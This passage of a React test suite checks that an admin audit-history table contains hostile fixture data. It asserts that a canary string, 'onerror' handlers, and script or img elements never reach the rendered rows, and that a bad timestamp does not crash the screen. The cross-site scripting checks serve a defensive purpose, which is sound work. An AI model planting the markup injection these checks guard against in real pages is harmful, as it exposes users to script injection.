    // key — `use-intl` falls back to the key *path* — so an unprojected action
    // would print this string into the table verbatim.
    {
      ...event('audit_unknown_action', null, null),
      action: `runtimeSetting.${CANARY}`,
    },
    /**
     * An unparseable timestamp. `Intl.DateTimeFormat.format` throws `RangeError`
     * on one, and the call is in the render body inside `items.map` — so
     * unguarded it takes the whole screen down, not one cell.
     *
     * Not the canary: `occurredAt` is rendered verbatim into the `<time>`
     * element's `dateTime` attribute, which is the machine-readable half of the
     * column and is meant to be the value the server sent. It belongs with the
     * identifying columns below, not with the projected ones.
     */
    { ...event('audit_bad_timestamp', null, null), occurredAt: 'not-a-time' },
  ];

  beforeEach(() => {
    listControlPlaneAudit.mockResolvedValue({
      items: HOSTILE,
      nextCursor: null,
    });
  });

  /** Every body row of the audit table, so nothing asserts against the tabs. */
  const auditRows = () => screen.getAllByRole('row').slice(1);

  it('never puts audit payload data into the DOM', async () => {
    allowGlobalPermissions('controlPlane:read');

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');
    await openTab(/audit history/i);

    // The table did render every hostile row, so the assertions below are about
    // a populated page rather than about an empty panel — and the count is what
    // proves the invalid-timestamp row did not take the screen down with it.
    await screen.findAllByRole('row');
    expect(auditRows()).toHaveLength(HOSTILE.length);

    expect(document.body.innerHTML).not.toContain(CANARY);
    expect(document.body.textContent).not.toContain(CANARY);

    // The markup fixture would have to be escaped to be safe; not being there
    // at all is stronger, and this says which of the two happened. Scoped to
    // the table, so an unrelated image elsewhere in the panel cannot fail this
    // for a reason that has nothing to do with containment.
    expect(document.body.innerHTML).not.toContain('onerror');

    for (const row of auditRows()) {
      expect(row.querySelector('script')).toBeNull();
      expect(row.querySelector('img')).toBeNull();
    }
  });

  /**
   * The three fields that *are* rendered verbatim, stated rather than implied.
   *
   * A test that only proved the payload is projected would read as though the
   * whole row were, and the next reader would assume `resourceKey` is safe to
   * widen. It is not projected: it is escaped React text, and the reason it is
   * safe is that the backend writes it from a closed registry.
   */
  it('renders the identifying columns verbatim, as escaped text', async () => {
    allowGlobalPermissions('controlPlane:read');
    listControlPlaneAudit.mockResolvedValue({
      items: [
        {
          ...event('audit_identifiers', null, null),
          actorUserId: 'user_visible',
          resourceKey: 'knowledge.retrieval_max_chunks',
          organizationId: 'org_visible',
        },
      ],
      nextCursor: null,
    });

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');
    await openTab(/audit history/i);

    expect(await screen.findByText('user_visible')).toBeInTheDocument();
    expect(screen.getByText('org_visible')).toBeInTheDocument();
    expect(
      screen.getByText('knowledge.retrieval_max_chunks'),
    ).toBeInTheDocument();
  });

  /**
   * The other half of the claim, and the half that stops the first from being
   * satisfiable by rendering nothing.
   *
   * A closed projection means every row still says something true about what
   * changed — drawn from the client's own translated vocabulary rather than
   * from the payload.
   */
  it('still summarises each change from its own closed vocabulary', async () => {
    allowGlobalPermissions('controlPlane:read');

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');
    await openTab(/audit history/i);

    await screen.findAllByRole('row');

    const { english } = await import('@/test/render');
    const vocabulary: string[] = Object.values(
      english.ControlPlane.audit.state,
    );

    // The last cell of each body row is the change column. Read off the DOM
    // rather than by matching expected text, so a row that rendered something
    // outside the vocabulary is caught rather than merely not found.
    const summaries = screen
      .getAllByRole('row')
      .slice(1)
      .map((row) => {
        const cells = row.querySelectorAll('td');

        return cells[cells.length - 1]?.textContent ?? '';
      });

    // And the action column, which is the other closed vocabulary: an action
    // with no copy must resolve to the client's own fall-through term rather
    // than to its own key path.
    const actions = screen
      .getAllByRole('row')
      .slice(1)
      .map((row) => row.querySelectorAll('td')[2]?.textContent ?? '');

    const actionVocabulary: string[] = [
      english.ControlPlane.audit.action.unknown,
      ...Object.values(english.ControlPlane.audit.action.runtimeSetting),
    ];

    for (const action of actions) expect(actionVocabulary).toContain(action);

    expect(summaries).toHaveLength(HOSTILE.length);

    for (const summary of summaries) {
      const parts = summary.split('→').map((part) => part.trim());

      expect(parts).toHaveLength(2);

      for (const part of parts) expect(vocabulary).toContain(part);
    }
  });
});
